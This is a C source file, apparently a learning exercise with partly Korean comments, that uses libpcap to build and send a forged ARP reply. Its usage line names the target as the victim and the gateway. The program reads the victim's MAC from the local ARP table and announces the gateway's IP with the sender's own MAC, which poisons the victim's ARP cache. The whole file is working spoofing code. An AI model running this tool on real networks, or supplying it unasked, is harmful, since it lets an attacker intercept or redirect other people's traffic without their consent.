/* send ARP reply for ARP spoofing */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <linux/if_ether.h>
#include <netinet/ether.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>


#define IP_ADDR_LEN      4
#define IP_STR_BUF_LEN   16

#define MAC_ADDR_LEN     6
#define MAC_STR_BUF_LEN  MAC_ADDR_LEN*2 + 5 + 1
#define ETH_HEADER_SIZE  14   // 6 + 6 + 2

#define SYS_NET_PATH      "/sys/class/net/%s/address"
#define SYS_NET_PATH_LEN  24
#define PROC_ARP_PATH     "/proc/net/arp"
#define ARP_TABLE_ENTRY_LEN 128 // interface name max-length : 15.

#define ARP_REPLY 2
#define ARP_REPLY_PACKET_SIZE 60


typedef struct _eth_header {
  uint8_t dst_addr[MAC_ADDR_LEN];
  uint8_t src_addr[MAC_ADDR_LEN];
  uint16_t ether_type;   // next protocol type
} __attribute__ ((packed)) eth_header;

typedef struct _arp_packet {
  uint16_t hd_type;
  uint16_t protocol_type;
  uint8_t  hd_size;
  uint8_t  protocol_size;
  uint16_t opcode;
  uint8_t  src_mac[MAC_ADDR_LEN];
  uint32_t  src_ip;
  uint8_t  dst_mac[MAC_ADDR_LEN];
  uint32_t  dst_ip; 
} __attribute__ ((packed)) arp_packet;

typedef struct _eth_arp_packet {
  eth_header eth;
  arp_packet arp;
  // uint8_t padding[18];
} __attribute__ ((packed)) eth_arp_packet;


void print_mac_addr(const char*, uint8_t (*)[6]);
void print_packet(u_char* p);

char* get_dev_mac(const char* dev);
char* get_hosts_mac(const char* target_ip_str);

int  fill_eth_arp_packet(eth_arp_packet*, const char*, const char*, const char*);
void fill_eth_header(eth_header*, const char*, const char*);
void fill_arp_packet(arp_packet*, const char*, const char*, const char*, const char*);



void usage(char *fname) {
  printf("syntax: %s <interface> <sender ip(victim)> <target ip(gateway)>\n", fname);
  printf("sample: %s wlan0 192.168.110.129 192.168.110.1\n", fname);
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage(argv[0]);
    return -1;
  }
  char* dev = argv[1];
  char* victim_ip_str  = argv[2];
  char* gateway_ip_str = argv[3];

  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  eth_arp_packet* packet = (eth_arp_packet*)malloc(sizeof(eth_arp_packet));
  if (fill_eth_arp_packet(packet, dev, gateway_ip_str, victim_ip_str) != 0) {
    perror("[*] fill_eth_arp_packet error");
    pcap_close(handle);
    return -1;
  };
  print_mac_addr("src_mac : ", (uint8_t (*)[6])packet->eth.src_addr);
  print_mac_addr("dst_mac : ", (uint8_t (*)[6])packet->eth.dst_addr);  
  print_packet((u_char*)packet);
  
  if (pcap_sendpacket(handle, (u_char*)packet, sizeof(eth_arp_packet)) == -1) {
      fprintf(stderr, "[*] send error : %s\n", pcap_geterr(handle));
  }
  
  pcap_close(handle);
  return 0;

}

void print_mac_addr(const char* str, uint8_t (*a)[6]) {
  printf("%s", str);
  printf("%02x:%02x:%02x:%02x:%02x:%02x\n", (*a)[0]
                                          , (*a)[1]
                                          , (*a)[2]
                                          , (*a)[3]
                                          , (*a)[4]
                                          , (*a)[5]);
}

void print_packet(u_char* p) {
  for (int i = 1; i < sizeof(eth_arp_packet); i++) {
    printf("%02x ", p[i]);
    if (i % 16 == 0) {
      printf("\n");
    }
  }
}

char* get_dev_mac(const char* dev) {
  size_t mac_path_len = SYS_NET_PATH_LEN + strlen(dev);
  char* mac_path = (char*)malloc(mac_path_len); 
  snprintf(mac_path, mac_path_len, SYS_NET_PATH, dev);

  FILE* fp = fopen(mac_path, "r");
  if (!fp) {
      fprintf(stderr, "[*] fopen(%s) error\n", mac_path);
      return NULL;
  }
  free(mac_path);

  char* mac_str = (char*)malloc(MAC_STR_BUF_LEN);
  fscanf(fp, "%s", mac_str);
  fclose(fp);

  return mac_str;
}

char* get_hosts_mac(const char* target_ip_str) {
  FILE* fp = fopen(PROC_ARP_PATH, "r");
  if (!fp) {
      fprintf(stderr, "[*] fopen(%s) error\n", PROC_ARP_PATH);
      return NULL;
  }
  
  char column[ARP_TABLE_ENTRY_LEN];
  if (!fgets(column, sizeof(column), fp)) {
    perror("[*] fgets error");
    return NULL;
  }
  // printf("%s\n", column);

  char* mac_str = (char*)malloc(MAC_STR_BUF_LEN);
  char  parsed_ip[IP_STR_BUF_LEN] = {0};
  
  fscanf(fp, "%s %*s %*s %s %*s %*s", parsed_ip, mac_str);
  while (strncmp(target_ip_str, parsed_ip, IP_STR_BUF_LEN-1) != 0) {
    if (feof(fp) != 0) {
      fprintf(stderr, "[*] There is no %s entry in ARP table\n", target_ip_str);
      return NULL;
    }
    fscanf(fp, "%s %*s %*s %s %*s %*s", parsed_ip, mac_str);
  }

  fclose(fp);
  return mac_str;
}



int fill_eth_arp_packet(eth_arp_packet* packet, const char* dev, 
                          const char* gateway_ip_str, const char* victim_ip_str) {
  /* input  : eth_arp_header pointer, interface string, vimtim ip string
   * output : (indirect) eth_arp_header is filled. but it's not returned.  */
  char* src_mac_str    = get_dev_mac(dev);
  char* victim_mac_str = get_hosts_mac(victim_ip_str);
  if ((src_mac_str == NULL) || (victim_mac_str == NULL)) {
    perror("[*] get_????_mac() error");
    return -1;
  }
  
  /* ***여기서 ether_aton(src_mac_str)을 계산해서 넘기지 않는 이유***
   ether_aton() 함수는 호출하자마자 결과로 리턴된 주소값을 어딘가에 memcpy()해두어야 한다.
   다음 ether_aton() 호출 시 바로 덮어 써져서 날아가기 때문.
   string을 넘기면 1. 좀 더 wrapping할 수 있다는 장점이 있다.
                  2. memcpy() 추가적으로 두 번 하는 것 보다 ether_aton() 두 번 호출하는게 나을 것 같다.
  */
  fill_eth_header(&packet->eth, src_mac_str, victim_mac_str);
  fill_arp_packet(&packet->arp, src_mac_str, victim_mac_str, gateway_ip_str, victim_ip_str);  

  free(src_mac_str);
  free(victim_mac_str);
  return 0;
}

void fill_eth_header(eth_header* eth, const char* src_mac_str, const char* dst_mac_str) {
  /** fill Ethernet header : MAC address 
   * output : (indirect) filled eth_header*
   * **/
  memcpy(&eth->src_addr, ether_aton(src_mac_str), MAC_ADDR_LEN);
  memcpy(&eth->dst_addr, ether_aton(dst_mac_str), MAC_ADDR_LEN);
  eth->ether_type = htons(ETH_P_ARP);
}

void fill_arp_packet(arp_packet* arp, const char* src_mac_str, const char* dst_mac_str,
                      const char* src_ip_str, const char* dst_ip_str) {
  /** fill ARP pakcet 
   * output : (indirect) filled arp_packet*
   * **/
  arp->hd_type = htons(1);     // Ethernet일 경우 1
  arp->protocol_type = htons(ETH_P_IP);
  arp->hd_size = MAC_ADDR_LEN;
  arp->protocol_size = IP_ADDR_LEN;
  arp->opcode = htons(ARP_REPLY);
  memcpy(&arp->src_mac, ether_aton(src_mac_str), MAC_ADDR_LEN);
  arp->src_ip = inet_addr(src_ip_str);    // inet_aton()와 struct in_addr을 사용해도 된다.
  memcpy(&arp->dst_mac, ether_aton(dst_mac_str), MAC_ADDR_LEN);
  arp->dst_ip = inet_addr(dst_ip_str);
}
